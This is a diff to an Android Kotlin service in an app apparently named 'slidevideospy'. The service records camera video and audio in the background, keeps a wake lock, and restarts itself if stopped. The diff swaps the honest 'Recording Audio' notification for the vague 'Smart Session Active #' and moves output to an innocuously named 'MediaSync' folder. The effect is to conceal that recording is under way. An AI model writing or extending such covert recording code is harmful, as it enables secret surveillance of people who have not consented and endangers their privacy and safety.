@@ -7,9 +7,11 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.ContentValues
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.graphics.PixelFormat
 import android.graphics.SurfaceTexture
 import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraCharacteristics
@@ -35,15 +37,42 @@ import android.media.AudioAttributes
 import android.media.AudioFocusRequest
 import android.media.AudioManager
 import android.media.MediaRecorder
+import android.net.Uri
 import android.os.Environment
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.Looper
+import android.os.ParcelFileDescriptor
 import android.os.PowerManager
+import android.provider.MediaStore
 import android.view.Surface
+import android.view.SurfaceHolder
+import android.view.SurfaceView
 import android.view.TextureView
+import androidx.annotation.RequiresApi
 import androidx.annotation.RequiresPermission
 import java.io.File
+import java.io.FileDescriptor
+import javax.microedition.khronos.egl.EGLConfig
+import javax.microedition.khronos.opengles.GL10
+import java.text.SimpleDateFormat
+import java.nio.ByteBuffer
+import java.nio.ByteOrder
+import java.nio.FloatBuffer
+import android.opengl.GLES20
+import android.opengl.GLSurfaceView
+import android.os.*
+import android.util.Size
+import android.view.Gravity
+import android.view.LayoutInflater
+import android.view.View
+import android.view.WindowManager
+import android.widget.Button
+import android.widget.FrameLayout
+import com.globewaystechnologies.slidevideospy.databinding.OverlayViewBinding
+import java.util.Date
+import java.util.Locale
+
 
 class PinkService : Service() {
 
@@ -53,6 +82,9 @@ class PinkService : Service() {
     private lateinit var cameraManager: CameraManager
     private lateinit var backgroundHandlerThread: HandlerThread
     private lateinit var backgroundHandler: Handler
+    private lateinit var recordingSurface: Surface
+
+
 
     private var cameraDevice: CameraDevice? = null
     private var mediaRecorder: MediaRecorder? = null
@@ -60,12 +92,18 @@ class PinkService : Service() {
     private lateinit var cameraId: String
 
     private lateinit var wakeLock: PowerManager.WakeLock
+    var videoUri: Uri? = null
+    var fileDescriptor: FileDescriptor? = null
+
+    private lateinit var overlayView: View
+    private lateinit var windowManager: WindowManager
+    private lateinit var overlayView2: FrameLayout
+    private lateinit var surfaceView: SurfaceView
 
 
-
-    private fun acquireWakeLock() {
+        private fun acquireWakeLock() {
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SlideViewSpy::CameraWakeLock")
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SlideViewSpy1::CameraWakeLock")
         wakeLock.acquire()
     }
 
@@ -111,19 +149,16 @@ class PinkService : Service() {
         fun getService(): PinkService = this@PinkService
     }
 
+    @RequiresApi(Build.VERSION_CODES.VANILLA_ICE_CREAM)
     @RequiresPermission(Manifest.permission.CAMERA)
     override fun onCreate() {
         super.onCreate()
-
+        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         acquireWakeLock()
+        // addOverlayWithCloseButton()
+//        startOverlayView()
 
-        startForeground(123,
-            createNotification(),
-            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-        )
-
-        Log.d("PinkService", "On Create Called" )
+        Log.d("PinkService", "On Create Services" )
 
     }
 
@@ -131,14 +166,22 @@ class PinkService : Service() {
     @RequiresPermission(Manifest.permission.CAMERA)
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
 
+        // showCameraOverlay()
 
+        startForeground(123,
+            createNotification(),
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK
+        )
 
 
         startCameraAndRecord()
 
+
         return START_STICKY
-
-
 
     }
 
@@ -156,8 +199,8 @@ class PinkService : Service() {
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Recording Audio")
-            .setContentText("Audio recording is in progress")
+            .setContentTitle("Smart Session Active #")
+            .setContentText("Current session is active #")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setOngoing(true)
             .build()
@@ -169,8 +212,10 @@ class PinkService : Service() {
     private fun startCameraAndRecord() {
 
         cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
-        cameraId = cameraManager.cameraIdList.first()
+//        cameraId = cameraManager.cameraIdList.first()
+        cameraId = cameraManager.cameraIdList[1]
         cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+            @RequiresApi(Build.VERSION_CODES.S)
             override fun onOpened(camera: CameraDevice) {
                 cameraDevice = camera
                 startRecordingSession()
@@ -186,55 +231,92 @@ class PinkService : Service() {
         }, null)
     }
 
+
+
+
     private fun startRecordingSession() {
         requestAudioFocus()
 
-        val mediaRecorder = MediaRecorder()
+        videoUri = createMediaStoreVideoUri(this)
+        val mediaRecorder = createMediaRecorder(this)
         this.mediaRecorder = mediaRecorder
-
 
         val publicDir = File(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
-            "MyAppVideos"
+            "MediaSync"
         )
         if (!publicDir.exists()) publicDir.mkdirs()
-
-        val videoFile = File(publicDir, "video_${System.currentTimeMillis()}.mp4")
-
+        // Define subdirectories "1" and "2"
+        val folder1 = File(publicDir, "1")
+        // Create subdirectories if they don't exist
+        if (!folder1.exists()) folder1.mkdirs()
+        val videoFile = File(folder1, "video_${System.currentTimeMillis()}.mp4")
         Log.d(
                 "PinkServiceCamera:",
                 "Camera Facing. :${publicDir}"
             )
 
+        videoUri?.let {
+            val fileDescriptor = contentResolver.openFileDescriptor(it, "w")?.fileDescriptor
+            this.fileDescriptor = fileDescriptor
+        }
+
         mediaRecorder.apply {
-            setOrientationHint(90)
-            setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+            setOrientationHint(270)
+            setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
             setVideoSource(MediaRecorder.VideoSource.SURFACE)
             setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            setOutputFile(videoFile.absolutePath)
+            setOutputFile(fileDescriptor)
+           // setOutputFile(videoFile.absolutePath)
             setVideoEncoder(MediaRecorder.VideoEncoder.H264)
             setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
             setAudioEncodingBitRate(96000)
-           // setAudioSamplingRate(44100)
-            setAudioSamplingRate(16000)
+            setAudioSamplingRate(44100)
             setVideoSize(1920, 1080)
-           // setVideoSize(1280, 720)
             setVideoFrameRate(30)
-            //setVideoEncodingBitRate(3 * 1024 * 1024)
-            setVideoEncodingBitRate(8 * 1024 * 1024)
-            //setVideoEncodingBitRate(10 * 1024 * 1024)
+            setVideoEncodingBitRate(3 * 1024 * 1024)
             prepare()
         }
 
+
+
+
+
+//            mediaRecorder.apply {
+//                setAudioSource(MediaRecorder.AudioSource.MIC)
+//                setVideoSource(MediaRecorder.VideoSource.SURFACE)
+//                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+//                setOutputFile(fileDescriptor)
+//                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+//                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+//                setVideoEncodingBitRate(10000000)
+//                setVideoFrameRate(30)
+//                setVideoSize(1280, 720)
+//                prepare()
+//            }
+
+
+
+
+
+
+
+
+
         val surfaces = ArrayList<Surface>()
         val recorderSurface = mediaRecorder.surface
+//        val previewSurface = surfaceView.holder.surface
         surfaces.add(recorderSurface)
+//        surfaces.add(previewSurface)
+
+
 
         cameraDevice?.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
             override fun onConfigured(session: CameraCaptureSession) {
                 cameraCaptureSession = session
                 val captureRequest = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                     addTarget(recorderSurface)
+//                    addTarget(previewSurface)
                 }
                 session.setRepeatingRequest(captureRequest.build(), null, null)
                 mediaRecorder.start()
@@ -255,7 +337,8 @@ class PinkService : Service() {
                 .setAudioAttributes(
                     AudioAttributes.Builder()
                         .setUsage(AudioAttributes.USAGE_MEDIA)
-                        .setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
+                        //.setContentType(AudioAttributes.CONTENT_TYPE_MOVIE)
+                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                         .build()
                 )
                 .build()
@@ -286,12 +369,171 @@ class PinkService : Service() {
         }
         cameraCaptureSession?.close()
         cameraDevice?.close()
-//        releaseWakeLock()
+        releaseWakeLock()
+
+        videoUri?.let {
+            val contentValues = ContentValues().apply {
+                put(MediaStore.Video.Media.IS_PENDING, 0)
+            }
+            contentResolver.update(it, contentValues, null, null)
+        }
+
+//        stopOverlayView()
+
     }
 
 
 
+    fun createMediaStoreVideoUri(context: Context): Uri? {
+        val contentValues = ContentValues().apply {
+            put(MediaStore.MediaColumns.DISPLAY_NAME, "video_${System.currentTimeMillis()}.mp4")
+            put(MediaStore.MediaColumns.MIME_TYPE, "video/mp4")
+            put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MOVIES + "/MediaSync") // Custom subfolder in Movies
+            put(MediaStore.Video.Media.IS_PENDING, 1)
+        }
 
+        val resolver = context.contentResolver
+        val collection = MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL_PRIMARY)
+
+        return resolver.insert(collection, contentValues)
+    }
+
+
+    @Suppress("DEPRECATION")
+    fun createMediaRecorder(context: Context): MediaRecorder {
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            MediaRecorder(context)
+        } else {
+            MediaRecorder()
+        }
+    }
+
+
+
+    private fun showCameraOverlay() {
+        surfaceView = SurfaceView(this)
+        surfaceView.holder.setFormat(PixelFormat.TRANSLUCENT)
+
+        val params = WindowManager.LayoutParams(
+            400, 400,
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+            PixelFormat.TRANSLUCENT
+        )
+
+        params.gravity = Gravity.TOP or Gravity.START
+        params.x = 100
+        params.y = 100
+
+        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        windowManager.addView(surfaceView, params)
+    }
+
+    private fun addOverlayWithCloseButton() {
+     //   windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+
+        // Create parent layout
+        overlayView2 = FrameLayout(this)
+
+        // Create and configure the SurfaceView
+        surfaceView = SurfaceView(this)
+        surfaceView.holder.setFormat(PixelFormat.TRANSLUCENT)
+        val surfaceLayoutParams = FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.MATCH_PARENT,
+            FrameLayout.LayoutParams.MATCH_PARENT
+        )
+
+        // Add close button
+        val closeButton = Button(this).apply {
+            text = "✕"
+            setBackgroundColor(0x88FF0000.toInt()) // Semi-transparent red
+            setOnClickListener {
+                try {
+                    windowManager.removeView(overlayView2)
+//                    overlayView2.visibility = View.GONE
+//                    overlayView2.visibility = View.VISIBLE
+                    toggleOverlay(true)
+                    //stopSelf()
+                    Toast.makeText(this@PinkService, "Overlay Closed", Toast.LENGTH_SHORT).show()
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+        }
+        val buttonParams = FrameLayout.LayoutParams(
+            100, 100,
+            Gravity.TOP or Gravity.END
+        )
+        buttonParams.setMargins(16, 16, 16, 16)
+
+        // Add views to layout
+        overlayView2.addView(surfaceView, surfaceLayoutParams)
+        overlayView2.addView(closeButton, buttonParams)
+
+        // WindowManager parameters
+        val overlayParams = WindowManager.LayoutParams(
+            600, 900,
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+            PixelFormat.TRANSLUCENT
+        )
+
+        overlayParams.gravity = Gravity.TOP or Gravity.START
+        overlayParams.x = 200
+        overlayParams.y = 900
+
+        windowManager.addView(overlayView2, overlayParams)
+    }
+
+    fun toggleOverlay(show: Boolean) {
+        if (::overlayView2.isInitialized) {
+            overlayView2.visibility = if (show) View.VISIBLE else View.GONE
+        }
+    }
+
+    fun startOverlayView() {
+        val overlayParams = WindowManager.LayoutParams(
+            WindowManager.LayoutParams.WRAP_CONTENT,
+            WindowManager.LayoutParams.WRAP_CONTENT,
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                WindowManager.LayoutParams.TYPE_PHONE,
+            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+            PixelFormat.TRANSLUCENT
+        )
+
+         overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_view, null)
+
+        windowManager.addView(overlayView, overlayParams)
+    }
+
+    private fun stopOverlayView() {
+
+
+        try {
+
+
+            if (::overlayView2.isInitialized && overlayView2.windowToken != null) {
+                windowManager.removeView(overlayView2)
+            }
+            windowManager.removeView(overlayView)
+            windowManager.removeView(surfaceView)
+
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
 
 
 }
